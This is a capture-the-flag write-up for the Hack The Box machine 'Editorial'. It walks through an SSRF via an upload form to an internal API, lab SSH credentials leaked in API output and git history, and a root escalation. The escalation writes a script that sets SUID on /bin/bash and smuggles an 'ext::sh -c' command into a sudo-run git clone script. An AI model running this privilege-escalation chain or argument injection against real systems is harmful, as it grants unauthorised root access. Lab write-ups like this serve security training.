# Editorial Write-up

<img src="https://labs.hackthebox.com/storage/avatars/a466db5ce4f7aaea98f588d1cb71a0aa.png" width="200" height="200">

## Recon 

### Port enumeration with Nmap

`nmap -sC -sV -p- 10.10.11.20`

Add domain name to `/etc/hosts`

    sudo echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts

`editorial.htb`

![image](https://github.com/zer00d4y/writeups/assets/128820441/07fdd17a-f5fe-47b2-b023-18ca896b2502)

`editorial.htb/upload`

![image](https://github.com/zer00d4y/writeups/assets/128820441/41e07ae5-ffed-4142-8dda-129aabe270ca)

![image](https://github.com/zer00d4y/writeups/assets/128820441/c4d5cf44-7914-4f2c-ab85-042f8fec1cf3)

![image](https://github.com/zer00d4y/writeups/assets/128820441/f756318a-78a9-4d6c-9df6-b2b89f9b9403)

`http://127.0.0.1:5000/`

![image](https://github.com/zer00d4y/writeups/assets/128820441/0216112e-e857-48ce-ad81-2ebc7ddecb6a)

static/uploads/d93ee52f-75f2-4273-b05c-f4932c366478

![image](https://github.com/zer00d4y/writeups/assets/128820441/d613d58e-5577-43ba-85ce-bea48a5ba8b9)

    {"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}

/api/latest/metadata/messages/authors

![image](https://github.com/zer00d4y/writeups/assets/128820441/52e8bd7a-5202-4c35-8260-4c477bed1700)

static/uploads/d1166303-dbfa-496d-b260-3f45d9b66c9a

![image](https://github.com/zer00d4y/writeups/assets/128820441/28f92595-3fe8-41cd-af0e-7441dcc57a18)

SSH credentials

`dev:dev080217_devAPI!@`

Get the user flag!

![image](https://github.com/zer00d4y/writeups/assets/128820441/a7e04a02-398a-4728-a9a2-03d4762f1c93)

## Root

![image](https://github.com/zer00d4y/writeups/assets/128820441/3ad2f8e3-b7e9-425b-8604-db6ca4fdcf5b)

![image](https://github.com/zer00d4y/writeups/assets/128820441/c8fe42b2-ef4e-4ed7-a9f9-2211a53b491e)

git show 1e84a036b2f33c59e2390730699a488c65643d28

    ...
    +        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
    ...

SSH credentials for `Prod`

`prod:080217_Producti0n_2023!@`

![image](https://github.com/zer00d4y/writeups/assets/128820441/16e93836-bbc6-4331-a261-0026caa67669)

    echo '#!/bin/bash' > /tmp/exploit.sh 
    
    echo 'chmod u+s /bin/bash' >> /tmp/exploit.sh  
      
    sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c '/tmp/exploit.sh'"  
      
    ls -l /bin/bash

![image](https://github.com/zer00d4y/writeups/assets/128820441/74d0eb0e-1475-4172-abd1-3bea6ca23bac)

Get the root flag!

![image](https://github.com/zer00d4y/writeups/assets/128820441/c7c2778a-c835-49dd-9232-acb92554cb2f)

